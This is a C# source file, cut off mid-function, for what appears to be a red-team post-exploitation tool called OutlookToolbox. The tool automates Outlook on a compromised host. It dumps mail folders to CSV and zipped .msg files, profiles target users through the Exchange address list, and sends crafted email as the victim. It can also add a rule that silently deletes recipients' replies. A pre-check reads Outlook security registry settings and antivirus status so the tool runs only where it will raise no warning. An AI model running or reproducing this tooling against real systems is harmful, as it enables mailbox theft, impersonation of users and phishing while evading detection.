using System;
using System.Runtime.InteropServices;
using gOutlook = Microsoft.Office.Interop.Outlook;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.IO.Packaging;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;

namespace OutlookToolbox_35_exe
{
    public class EXECalls
    {
        static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                switch (args[0])
                {
                    case "EnumerateFolders":
                        if (args.Length == 1)
                        {
                            EnumerateFolders();
                        }
                        else PrintUsage();
                        return;
                    case "EmailPivot":
                        if (args.Length == 2)
                        {
                            EmailPivot(args[1], false);                      
                        }
                        else if(args.Length == 3 && args[2] == "mute")
                        {                            
                            EmailPivot(args[1], true);
                        }
                        else PrintUsage();                        
                        return;
                    case "FolderToCSV":
                        if (args.Length == 2)
                        {
                            FolderToCSV(args[1]);
                        }
                        else PrintUsage();                        
                        return;
                    case "EnumerateTarget":
                        if (args.Length == 2)
                        {
                            EnumerateTarget(args[1]);
                        }
                        else PrintUsage();
                        return;
                    case "ExportMessage":
                        if (args.Length == 4)
                        {
                            if ((args[2] == "senderemail") || (args[2] == "index") || (args[2] == "entryid"))
                            {
                                ExportMessage(args[1], args[2], args[3]);
                            }
                            else PrintUsage();                                                       
                        }
                        else PrintUsage();
                        return;
                    case "SanityCheck":
                        SanityCheck();
                        return;
                    default:
                        PrintUsage();
                        return;
                }
                   
                
            }
            else
            {
                PrintUsage();
            }
        }
      
        static void PrintUsage()
        {
            Console.WriteLine("--------------OutlookToolbox Usage--------------");
            Console.WriteLine("------------------------------------------------------------------------------------------------");
            Console.WriteLine("Run OutlookToolbox's popup detection function. This runs before all the functions but if you want to run it solo ... here it is");
            Console.WriteLine("Usage - OutlookToolbox.exe SanityCheck");            
            Console.WriteLine("------------------------------------------------------------------------------------------------");           
            Console.WriteLine("Enumerate Outlook Folders (Inbox, Sent Items, Conversation History ...) and print results to console.");
            Console.WriteLine("Usage - OutlookToolbox.exe EnumerateFolders");
            Console.WriteLine("------------------------------------------------------------------------------------------------");
            Console.WriteLine("Export target Outlook Folder to CSV in the %APPDATA% folder. Truncate message body to 1000 characters.");
            Console.WriteLine("Usage - OutlookToolbox.exe FolderToCSV *TargetFolder*");
            Console.WriteLine("Example - OutlookToolbox.exe FolderToCSV \"Sent Items\"");
            Console.WriteLine("------------------------------------------------------------------------------------------------");
            Console.WriteLine("Export target email(s) to .msg format. Can export single emails or collection of emails based on sender email.");
            Console.WriteLine("Writes results to %APPDATA%. Using senderemail will zip up the emails, other two just export the .msg file.");
            Console.WriteLine("Usage - OutlookToolbox.exe ExportMessage *TargetFolder* *Criteria* *Filter*");
            Console.WriteLine("Criteria can be senderemail, index, or entryid. Index and entryid you will find in the FolderToCSV results.");
            Console.WriteLine("Example - OutlookToolbox.exe ExportMessage inbox senderemail cpl@cpl.com");
            Console.WriteLine("Example - OutlookToolbox.exe ExportMessage \"Sent Items\" index 1234");
            Console.WriteLine("------------------------------------------------------------------------------------------------");
            Console.WriteLine("Enumerate target user via GAL. Returns name, username, job title, manager, colleagues under same manager, etc.");
            Console.WriteLine("Usage - OutlookToolbox.exe EnumerateTarget *Username, Email, or Name*");
            Console.WriteLine("Example - OutlookToolbox.exe EnumerateTarget \"joe smith\"");
            Console.WriteLine("Example - OutlookToolbox.exe EnumerateTarget \"cpl\"");
            Console.WriteLine("------------------------------------------------------------------------------------------------");
            Console.WriteLine("Send email from Outlook session. Takes a .msg file that you previously crafted included To field. Temp location of the .msg file is %APPDATA%");
            Console.WriteLine("Also has the ability to create an outlook rule that moves all replies from users in the To field to deleted items (mute) ... messy to clean up, don't use unless you're getting real with it.");
            Console.WriteLine("Usage - OutlookToolbox EmailPivot *Local Path to .msg File* mute");
            Console.WriteLine("Example - (without mute) - OutlookToolbox EmailPivot \"/tmp/cpl.msg\"");
            Console.WriteLine("Example - (with mute)    - OutlookToolbox EmailPivot \"/tmp/cpl.msg\" mute");
            Console.WriteLine("------------------------------------------------------------------------------------------------");
        }
        
        //Enumerates parent and child Outlook folders
        //Exports results to OutlookFolders.txt
        static void EnumerateFolders()
        {
            try
            {
                if (NoPopups.SanityCheck())
                {
                    Console.WriteLine("Starting EnumerateFolders");
                    OToolbox.EnumerateFoldersinDefaultStore();
                }
            }
            catch
            { }
        }

        //Sends an Email on behalf of the target user
        //If toggled, will call mute method to create a rule to move incoming messages to recipients to the Deleted Items folder
        //[0] - .MSG File (No Spaces)
        //[1] - Mute
        static void EmailPivot(string MessageFile, bool Mute)
        {
            try
            {
                if (NoPopups.SanityCheck())
                {
                    Console.WriteLine("Starting EmailPivot");
                    OToolbox.oEmailPivot(MessageFile, Mute);
                }
            }
            catch
            { }
        }

        //Exports target folder to CSV
        static void FolderToCSV(string TargetFolder)
        {
            try
            {
                if (NoPopups.SanityCheck())
                {
                    Console.WriteLine("Starting FolderToCSV");
                    OToolbox.oFolderToCSV(TargetFolder);
                }
            }
            catch
            { }
        }

        //Enumerates target user
        //Enumerates - Name, Username, Email Address, Job Title, City, Manager Name, and Colleagues (Reports to Same Manager)
        static void EnumerateTarget(string TargetUser)
        {
            try
            {
                if (NoPopups.SanityCheck())
                {
                    Console.WriteLine("Starting EnumerateTarget");
                    OToolbox.oEnumerateTarget(TargetUser);
                }
            }
            catch
            { }
        }

        //[0] - Target Folder
        //[1] - Download filter (senderemail, index, entryid)
        //[2] - Sender's email address, index number, or entryid
        //Exports Target Message(s)
        static void ExportMessage(string TargetFolder, string DownloadFilter, string SearchString)
        {
            try
            {
                if (NoPopups.SanityCheck())
                {
                    Console.WriteLine("Starting ExportMessage");
                    OToolbox.oExportMessage(TargetFolder, DownloadFilter, SearchString);
                }
            }
            catch
            { }
        }
     
        static void SanityCheck()
        {
            try
            {
                Console.WriteLine("Starting SanityCheck");
                if (NoPopups.SanityCheck())
                {
                    Console.WriteLine("SanityCheck has PASSED.");
                    Console.WriteLine("No guarantees, but it looks like you'll generate no popups.");                 
                }
            }
            catch
            { }
        }
    }

    public class NoPopups
    {
        //https://chentiangemalc.wordpress.com/2013/04/09/accessing-windows-security-centre-status-from-powershell/    
        public enum WSC_SECURITY_PROVIDER : int
        {
            WSC_SECURITY_PROVIDER_FIREWALL = 1,             // The aggregation of all firewalls for this computer.
            WSC_SECURITY_PROVIDER_AUTOUPDATE_SETTINGS = 2,  // The automatic update settings for this computer.
            WSC_SECURITY_PROVIDER_ANTIVIRUS = 4,            // The aggregation of all antivirus products for this computer.
            WSC_SECURITY_PROVIDER_ANTISPYWARE = 8,          // The aggregation of all anti-spyware products for this computer.
            WSC_SECURITY_PROVIDER_INTERNET_SETTINGS = 16,   // The settings that restrict the access of web sites in each of the Internet zones for this computer.
            WSC_SECURITY_PROVIDER_USER_ACCOUNT_CONTROL = 32,    // The User Account Control (UAC) settings for this computer.
            WSC_SECURITY_PROVIDER_SERVICE = 64,             // The running state of the WSC service on this computer.
            WSC_SECURITY_PROVIDER_NONE = 0,                 // None of the items that WSC monitors.

            // All of the items that the WSC monitors.
            WSC_SECURITY_PROVIDER_ALL = WSC_SECURITY_PROVIDER_FIREWALL | WSC_SECURITY_PROVIDER_AUTOUPDATE_SETTINGS | WSC_SECURITY_PROVIDER_ANTIVIRUS |
            WSC_SECURITY_PROVIDER_ANTISPYWARE | WSC_SECURITY_PROVIDER_INTERNET_SETTINGS | WSC_SECURITY_PROVIDER_USER_ACCOUNT_CONTROL |
            WSC_SECURITY_PROVIDER_SERVICE | WSC_SECURITY_PROVIDER_NONE
        }
        public enum WSC_SECURITY_PROVIDER_HEALTH : int
        {
            WSC_SECURITY_PROVIDER_HEALTH_GOOD,          // The status of the security provider category is good and does not need user attention.
            WSC_SECURITY_PROVIDER_HEALTH_NOTMONITORED,  // The status of the security provider category is not monitored by WSC. 
            WSC_SECURITY_PROVIDER_HEALTH_POOR,          // The status of the security provider category is poor and the computer may be at risk.
            WSC_SECURITY_PROVIDER_HEALTH_SNOOZE,        // The security provider category is in snooze state. Snooze indicates that WSC is not actively protecting the computer.
            WSC_SECURITY_PROVIDER_HEALTH_UNKNOWN
        }

        public static bool SanityCheck()
        {
            //System.IO.StreamWriter oSanityLog = new System.IO.StreamWriter("SanityCheck.txt");
            try
            {
                byte[] regCheck = null;
                string oOMGState = null;
                System.Diagnostics.Process[] oProcesses = System.Diagnostics.Process.GetProcessesByName("OUTLOOK");

                Type officeType = Type.GetTypeFromProgID("Outlook.Application");
                if (officeType == null)
                {
                    Console.WriteLine("Outlook is not installed.  Quitting ....");                    
                    return false;
                }


                //https://support.microsoft.com/en-ca/help/3189806/-a-program-is-trying-to-send-an-e-mail-message-on-your-behalf-warning
                string[] regValues = {
                    "SOFTWARE\\Microsoft\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\14.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\14.0\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\15.0\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\16.0\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Office\\14.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Office\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Office\\16.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\Wow6432Node\\14.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\Wow6432Node\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\Wow6432Node\\16.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\14.0\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\Wow6432Node\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\15.0\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\Wow6432Node\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\16.0\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\Wow6432Node\\16.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\14.0\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Office\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\15.0\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Office\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\16.0\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Office\\16.0\\Outlook\\Security",
                    "SOFTWARE\\Wow6432Node\\Microsoft\\Office\\14.0\\Outlook\\Security",
                    "SOFTWARE\\Wow6432Node\\Microsoft\\Office\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Wow6432Node\\Microsoft\\Office\\16.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\14.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\15.0\\Outlook\\Security",
                    "SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Security"
                };

                for (int regI = 0; regI < regValues.Length; regI++)
                {
                    regCheck = RegistryWOW6432.GetRegKey64AsByteArray(RegHive.HKEY_LOCAL_MACHINE, regValues[regI], "ObjectModelGuard");
                    if (regCheck != null)
                    {
                        oOMGState = (BitConverter.ToString(regCheck)).Replace("-", "");
                        break;
                    }
                }

                if (oOMGState == "01000000")
                {
                    Console.WriteLine("ObjectModelGuard is configured to report all COM access, this tool will be detected.  Quitting ...");
                    return false;
                }

                else if (oOMGState == "00000000")
                {
                    Console.WriteLine("ObjectModelGuard is configured to report COM access if AV is not enabled or up-to-date.  I will query AV status to see if I should continue.");
                    WSC_SECURITY_PROVIDER_HEALTH avStatus = GetSecurityProviderHealth(WSC_SECURITY_PROVIDER.WSC_SECURITY_PROVIDER_ANTIVIRUS);

                    if (avStatus != WSC_SECURITY_PROVIDER_HEALTH.WSC_SECURITY_PROVIDER_HEALTH_GOOD)
                    {
                        Console.WriteLine("Antivirus is out of date or not working, running OutlookToolbox could trigger an Outlook popup.  Quitting ...");                       
                        return false;
                    }
                }
                else if (oOMGState == null)
                {
                    Console.WriteLine("ObjectModelGuard registry key could not be found.  MS stashes these in multiple locations so maybe it is somewhere else or maybe it doesn't exist ... sorry :(./r/n You could recompile with these checks turned off. ");                    
                    return false;
                }


                if (oProcesses.Length == 1)
                {
                    //Looks like this isn't needed
                    /*
                    if (!CurrentProcessIsWow64(oProcesses[0]))
                    {
                        oSanityLog.WriteLine("Outlook is running as a x64 process.  This is a x86 DLL, I'm not sure what will happen if we continue. Quitting ...");
                        oSanityLog.Close();
                        return false;
                    }*/
                    if (UacHelper.IsProcessElevated(System.Diagnostics.Process.GetCurrentProcess()) == UacHelper.IsProcessElevated(oProcesses[0]))
                    {
                        return true;
                    }
                    //I don't think this is required.  Integrity mismatch goes to catch
                    else
                    {
                        Console.WriteLine("Integrity mismatch.  Quitting ...");                       
                        return false;
                    }
                }
                else if (oProcesses.Length >= 2)
                {
                    Console.WriteLine("Multiple Outlook processes running.  Quitting ....");                   
                    return false;
                }
                else if (oProcesses.Length == 0)
                {
                    Console.WriteLine("No Outlook process running.  Quitting ...");                   
                    return false;
                }
                Console.WriteLine("Something else happened.  Quitting ...");               
                return false;
            }

            catch (Exception e)
            {
                if (e.ToString().Contains("Access is denied"))
                {
                    Console.WriteLine("Integrity mismatch.  Quitting ...\r\n");
                    Console.WriteLine(e);
                }
                else Console.WriteLine(e);               
                return false;
            }
        }
        [DllImport("wscapi.dll")]
        private static extern int WscGetSecurityProviderHealth(int inValue, ref int outValue);

        // code to call our interop function and return the relevant result based on what input value we provide
        public static WSC_SECURITY_PROVIDER_HEALTH GetSecurityProviderHealth(WSC_SECURITY_PROVIDER inputValue)
        {
            int inValue = (int)inputValue;
            int outValue = -1;

            int result = WscGetSecurityProviderHealth(inValue, ref outValue);

            foreach (WSC_SECURITY_PROVIDER_HEALTH wsph in Enum.GetValues(typeof(WSC_SECURITY_PROVIDER_HEALTH)))
                if ((int)wsph == outValue) return wsph;

            return WSC_SECURITY_PROVIDER_HEALTH.WSC_SECURITY_PROVIDER_HEALTH_UNKNOWN;
        }
        /*
        //http://vincenth.net/blog/archive/2009/11/02/detect-32-or-64-bits-windows-regardless-of-wow64-with-the-powershell-osarchitecture-function.aspx
        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);

        // This overload returns True if the current process is running on Wow, False otherwise
        public static bool CurrentProcessIsWow64(System.Diagnostics.Process ouProcess)
        {
            bool retVal;
            if (!(IsWow64Process(ouProcess.Handle, out retVal))) { throw new Exception("IsWow64Process() failed"); }
            return retVal;
        }*/
    }

    public class OToolbox
    {
        private static gOutlook.Application oOutlook = null;
        private static gOutlook.NameSpace oNS = null;
        private static gOutlook.Folder oRoot = null;
        private static gOutlook.MAPIFolder oCtFolder = null;
        private static object oCts = null;
        private static gOutlook.MailItem oMail = null;
        private static gOutlook.MAPIFolder oNewFolder = null;
        private static gOutlook.Recipients oRecips = null;
        private static gOutlook.Recipient oRecip = null;
        private static gOutlook.ExchangeUser oExchangeUser = null;
        private static gOutlook.ExchangeUser oExchangeManager = null;
        private static gOutlook.AddressEntries oExchangeAEntries = null;
        private static gOutlook.AddressEntry oExchangeAEntry = null;
        private static gOutlook.Attachments oAttach = null;
        private static gOutlook.Rules oRules = null;
        private static gOutlook.Rule oRule = null;
        private static gOutlook.PropertyAccessor oPA = null;

        public static void EnumerateFoldersinDefaultStore()
        {
            try
            {
                //System.IO.StreamWriter oFolderFile = new System.IO.StreamWriter("OutlookFolders.txt");
                Console.WriteLine("Folder Name,Number of Items");
                oOutlook = new gOutlook.Application();
                oNS = oOutlook.GetNamespace("MAPI");
                oRoot = oOutlook.Application.Session.DefaultStore.GetRootFolder() as gOutlook.Folder;
                gOutlook.Folders childFolders = oRoot.Folders;
                oEnumerateFolders(oRoot);                
            }
            catch
            { }
            finally
            {
                CleanUp();
            }
        }

        public static void oEmailPivot(string EPInput, bool Mute)
        {
            try
            {
                oOutlook = new gOutlook.Application();
                //oMail = (gOutlook.MailItem)oOutlook.CreateItemFromTemplate(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + EPInput);
                oMail = (gOutlook.MailItem)oOutlook.CreateItemFromTemplate(EPInput);
                oRecips = (gOutlook.Recipients)oMail.Recipients;
                oRecips.ResolveAll();
                oMail.DeleteAfterSubmit = true;
                oMail.Send();

                if (Mute == true)
                {
                    Console.WriteLine("Damn, it's getting real. Creating Outlook rule to delete replies from TO users. Be a good operator and clean it up after the engagement");
                    foreach (gOutlook.Recipient oRecip in oRecips)
                    {
                        oPA = oRecip.PropertyAccessor;
                        MuteUser(oPA.GetProperty("http://schemas.microsoft.com/mapi/proptag/0x39FE001E").ToString());
                    }
                }
                Console.WriteLine("EmailPivot complete.");
            }
            catch
            { }
            finally
            {
                CleanUp();
            }
        }

        public static void oFolderToCSV(string targetFolder)
        {
            try
            {
                //string folderOut = targetFolder.Replace(" ", string.Empty);
                string folderOut = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + targetFolder + "_Export.csv";               
                Console.WriteLine("Folder contents will be exported to " + folderOut + " to and you will get a notification when it's complete. This will take a while for larger folders.");               
                CsvFileWriter writer = new CsvFileWriter(folderOut);
                oOutlook = new gOutlook.Application();
                oNS = oOutlook.GetNamespace("MAPI");
                oRoot = oOutlook.Application.Session.DefaultStore.GetRootFolder() as gOutlook.Folder;
                oCtFolder = oRoot.Folders[targetFolder];
                oCts = oCtFolder.Items;

                const int MaxSize = 1000;
                int i = 0;
                string oIndex = null;

                CsvRow headers = new CsvRow();
                headers.Add("INDEX");
                headers.Add("ENTRY ID");
                headers.Add("TYPE");
                headers.Add("DATE: YYYY-MM-DD");
                headers.Add("FROM NAME");
                headers.Add("FROM EMAIL");
                headers.Add("SUBJECT");
                headers.Add("BODY");
                headers.Add("ATTACHMENTS");
                writer.WriteRow(headers);

                foreach (object oCts in oCtFolder.Items)
                {
                    CsvRow row = new CsvRow();
                    string oEntryID = null;
                    string oType = null;
                    string oReceiveDate = null;
                    string oSubject = null;
                    string oFromName = null;
                    string oFromEmail = null;
                    string oBody = null;
                    string oAttachment = null;
                    string oMeetingOrg = null;
                    i++;

                    try
                    {
                        //find a workaround
                        //object isencrypt = ((Microsoft.Office.Interop.Outlook.MailItem)oCts[i]).PropertyAccessor.GetProperty("http://schemas.microsoft.com/mapi/proptag/0x6E010003");
                        //Console.WriteLine(isencrypt);   

                        if (oCts is gOutlook.MailItem)
                        {
                            oIndex = i.ToString();
                            oType = "Mail Item";
                            oEntryID = ((gOutlook.MailItem)oCts).EntryID.ToString();
                            oReceiveDate = ((gOutlook.MailItem)oCts).ReceivedTime.ToString("yyyy-MM-dd");
                            oFromName = ((gOutlook.MailItem)oCts).SenderName.ToString();
                            if (((gOutlook.MailItem)oCts).SenderEmailType == "EX")
                            {
                                oExchangeAEntry = ((gOutlook.MailItem)oCts).Sender;
                                if (oExchangeAEntry != null)
                                {
                                    oExchangeUser = oExchangeAEntry.GetExchangeUser();
                                    if (oExchangeUser != null) oFromEmail = oExchangeUser.PrimarySmtpAddress.ToString();
                                }
                            }
                            else oFromEmail = ((gOutlook.MailItem)oCts).SenderEmailAddress.ToString();
                            oSubject = ((gOutlook.MailItem)oCts).Subject.ToString();
                            oBody = ((gOutlook.MailItem)oCts).Body.ToString();
                            oAttach = ((gOutlook.MailItem)oCts).Attachments;

                            if (oAttach.Count > 0)
                            {
                                for (int j = 1; j <= oAttach.Count; j++)
                                {
                                    oAttachment += (((gOutlook.MailItem)oCts).Attachments[1].FileName.ToString()) + " || ";
                                }
                            }

                            //Outlook.Attachments test = oItem.Attachment[i];
                            //oAttachment = (Outlook.Attachment)oCts[i].FileName;

                            oBody = oBody.Replace("\r\n", " ");
                            oBody = oBody.Replace("\r", " ");
                            oBody = oBody.Replace("\n", " ");
                            if (oBody.Length > MaxSize) oBody = oBody.Substring(0, MaxSize - 3) + "...";

                        }
                        //TLC Later
                        else if (oCts is gOutlook.ContactItem)
                        {
                            oIndex = i.ToString();
                            oType = "Contact Item";
                            oEntryID = ((gOutlook.ContactItem)oCts).EntryID.ToString();
                        }
                        //TLC Later
                        else if (oCts is gOutlook.AppointmentItem)
                        {
                            oType = "Appointment Item";
                        }
                        //TLC Later
                        else if (oCts is gOutlook.OlItemType.olTaskItem)
                        {
                            oType = "Task Item";
                        }

                        else if (oCts is gOutlook.MeetingItem)
                        {
                            oIndex = i.ToString();
                            oType = "Meeting Item";
                            oEntryID = ((gOutlook.MeetingItem)oCts).EntryID.ToString();
                            oReceiveDate = ((gOutlook.MeetingItem)oCts).ReceivedTime.ToString("yyyy-MM-dd");
                            oFromName = ((gOutlook.MeetingItem)oCts).SenderName.ToString();
                            oSubject = ((gOutlook.MeetingItem)oCts).Subject.ToString();
                            if (((gOutlook.MeetingItem)oCts).SenderEmailType == "EX")
                            {
                                oMeetingOrg = ((gOutlook.MeetingItem)oCts).PropertyAccessor.BinaryToString(((gOutlook.MeetingItem)oCts).PropertyAccessor.GetProperty("http://schemas.microsoft.com/mapi/proptag/0x00410102"));
                                oExchangeAEntry = oOutlook.Session.GetAddressEntryFromID(oMeetingOrg);
                                if (oExchangeAEntry != null)
                                {
                                    oExchangeUser = oExchangeAEntry.GetExchangeUser();
                                    if (oExchangeUser != null) oFromEmail = oExchangeUser.PrimarySmtpAddress.ToString();
                                }
                            }
                            else oFromEmail = ((gOutlook.MeetingItem)oCts).SenderEmailAddress.ToString();
                            oBody = ((gOutlook.MeetingItem)oCts).Body.ToString();
                            oAttach = ((gOutlook.MeetingItem)oCts).Attachments;
                            if (oAttach.Count > 0)
                            {
                                for (int j = 1; j <= oAttach.Count; j++)
                                {
                                    oAttachment += (((gOutlook.MailItem)oCts).Attachments[1].FileName.ToString()) + " || ";
                                }
                            }
                        }
                        //TLC Later
                        else
                        {
                            oType = "Unknown";
                        }

                        row.Add(oIndex);
                        if (oEntryID != null) row.Add(oEntryID);
                        else row.Add(" ");
                        row.Add(oType);
                        if (oReceiveDate != null) row.Add(oReceiveDate);
                        else row.Add(" ");
                        if (oFromName != null) row.Add(oFromName);
                        else row.Add(" ");
                        if (oFromEmail != null) row.Add(oFromEmail);
                        else row.Add(" ");
                        if (oSubject != null) row.Add(oSubject);
                        else row.Add(" ");
                        if (oBody != null) row.Add(oBody);
                        else row.Add(" ");
                        if (oAttachment != null) row.Add(oAttachment);
                        else row.Add(" ");
                        writer.WriteRow(row);

                        if (oCts != null)
                        {
                            Marshal.FinalReleaseComObject(oCts);
                        }
                       
                    }
                    catch
                    { }
                }
                Console.WriteLine("FolderToCSV complete. Go grab your CSV from " + folderOut);
            }
            catch
            { }
            finally
            {
                CleanUp();
            }
        }

        public static void oEnumerateTarget(string targetUser)
        {
            try
            {
                oOutlook = new gOutlook.Application();
                oNS = oOutlook.Session;
                oMail = (gOutlook.MailItem)oOutlook.CreateItem(gOutlook.OlItemType.olMailItem);
                oRecips = oMail.Recipients;
                oRecip = oRecips.Add(targetUser);
                oRecip.Resolve();
                if (oRecip.Resolved)
                {
                    oExchangeUser = oRecip.AddressEntry.GetExchangeUser();
                    if (oExchangeUser.Name != null) Console.WriteLine("Name: " + oExchangeUser.Name.ToString());
                    if (oExchangeUser.Alias != null) Console.WriteLine("Alias: " + oExchangeUser.Alias.ToString());
                    if (oExchangeUser.PrimarySmtpAddress != null) Console.WriteLine("Email Address: " + oExchangeUser.PrimarySmtpAddress.ToString());
                    if (oExchangeUser.JobTitle != null) Console.WriteLine("Job Title: " + oExchangeUser.JobTitle.ToString());
                    if (oExchangeUser.City != null) Console.WriteLine("City: " + oExchangeUser.City.ToString());
                    if (oExchangeUser.BusinessTelephoneNumber != null) Console.WriteLine("Business Phone: " + oExchangeUser.BusinessTelephoneNumber.ToString());
                    if (oExchangeUser.GetExchangeUserManager() != null)
                    {
                        oExchangeManager = oExchangeUser.GetExchangeUserManager();
                        Console.WriteLine("Manager Name: " + oExchangeManager.Name.ToString());
                        oExchangeAEntries = oExchangeManager.GetDirectReports();
                        foreach (gOutlook.AddressEntry oExchangeEntry in oExchangeAEntries)
                        {
                            Console.WriteLine("\tReports to Same Manager (Name): " + oExchangeEntry.GetExchangeUser().Name.ToString());
                        }
                    }
                }
                else Console.WriteLine("Target did not resolve");
                Console.WriteLine("EnumerateTarget complete.");
            }
            catch
            { }
            finally
            {
                CleanUp();
            }
        }

        public static void oExportMessage(string targetFolder, string tFilter, string tSearch)
        {
            try
            {
                //string folderOut = targetFolder.Replace(" ", string.Empty);
                string folderOut = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                Console.WriteLine("Message(s) will be exported to " + folderOut + " to and you will get a notification when it's complete. If using sender email the messages will be zipped and it can take a bit.");
                oOutlook = new gOutlook.Application();
                oNS = oOutlook.GetNamespace("MAPI");
                oRoot = oOutlook.Application.Session.DefaultStore.GetRootFolder() as gOutlook.Folder;
                oCtFolder = oRoot.Folders[targetFolder];
                oCts = oCtFolder.Items;
                int i = 0;
                string oFromEmail = null;
                string currentFile = null;
                string oIndex = null;
                string oEntryID = null;
                //string folderOut = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                if (tFilter == "senderemail")
                {
                    using (Package package = ZipPackage.Open(folderOut + "\\" + tSearch + ".zip", FileMode.Create))
                    {
                        foreach (object oCts in oCtFolder.Items)
                        {
                            i++;
                            try
                            {
                                if (oCts is gOutlook.MailItem)
                                {
                                    if (((gOutlook.MailItem)oCts).SenderEmailType == "EX")
                                    {
                                        oExchangeAEntry = ((gOutlook.MailItem)oCts).Sender;
                                        if (oExchangeAEntry != null)
                                        {
                                            oExchangeUser = oExchangeAEntry.GetExchangeUser();
                                            if (oExchangeUser != null) oFromEmail = oExchangeUser.PrimarySmtpAddress.ToString();
                                        }
                                    }
                                    else oFromEmail = ((gOutlook.MailItem)oCts).SenderEmailAddress.ToString();

                                    if (string.Equals(oFromEmail, tSearch, StringComparison.CurrentCultureIgnoreCase))
                                    {
                                        currentFile = Environment.CurrentDirectory + "\\" + oFromEmail + "_" + i + ".msg";
                                        ((gOutlook.MailItem)oCts).SaveAs(currentFile, gOutlook.OlSaveAsType.olMSG);
                                        Uri relUri = GetRelativeUri(currentFile);
                                        PackagePart packagePart = package.CreatePart(relUri, System.Net.Mime.MediaTypeNames.Application.Octet, CompressionOption.Maximum);
                                        using (FileStream fileStream = new FileStream(currentFile, FileMode.Open, FileAccess.Read))
                                        {
                                            CopyStream(fileStream, packagePart.GetStream());
                                        }
                                        File.Delete(currentFile);
                                    }
                                }
                                if (oCts != null)
                                {
                                    Marshal.FinalReleaseComObject(oCts);
                                }
                            }
                            catch
                            { }
                        }
                    }
                }
                else if (tFilter == "index")
                {
                    foreach (object oCts in oCtFolder.Items)
                    {
                        i++;
                        oIndex = i.ToString();
                        try
                        {
                            if (oCts is gOutlook.MailItem)
                            {
                                if (string.Equals(oIndex, tSearch, StringComparison.CurrentCultureIgnoreCase))
                                {
                                    currentFile = folderOut + "\\" + i + ".msg";
                                    ((gOutlook.MailItem)oCts).SaveAs(currentFile, gOutlook.OlSaveAsType.olMSG);
                                }
                            }
                            if (oCts != null)
                            {
                                Marshal.FinalReleaseComObject(oCts);
                            }

                        }
                        catch
                        { }
                    }
                }
                else if (tFilter == "entryid")
                {
                    foreach (object oCts in oCtFolder.Items)
                    {
                        i++;
                        oEntryID = ((gOutlook.MailItem)oCts).EntryID.ToString();
                        try
                        {
                            if (oCts is gOutlook.MailItem)
                            {
                                if (string.Equals(oEntryID, tSearch, StringComparison.CurrentCultureIgnoreCase))
                                {
                                    currentFile = folderOut + "\\" + oEntryID + ".msg";
                                    ((gOutlook.MailItem)oCts).SaveAs(currentFile, gOutlook.OlSaveAsType.olMSG);
                                }
                            }
                            if (oCts != null)
                            {
                                Marshal.FinalReleaseComObject(oCts);
                            }

                        }
                        catch
                        { }
                    }

                }
                Console.WriteLine("ExportMessage complete. Go grab your message(s) from " + folderOut);
            }
            catch
            { }
            finally
            {
                CleanUp();
            }
        }      

        private static void oEnumerateFolders(gOutlook.Folder folder)
        {
            try
            {               
                gOutlook.Folders childFolders = folder.Folders;
                if (childFolders.Count > 0)
                {
                    foreach (gOutlook.Folder childFolder in childFolders)
                    {
                        Console.WriteLine(childFolder.FolderPath + "," + childFolder.Items.Count);
                        oEnumerateFolders(childFolder);
                    }
                }               
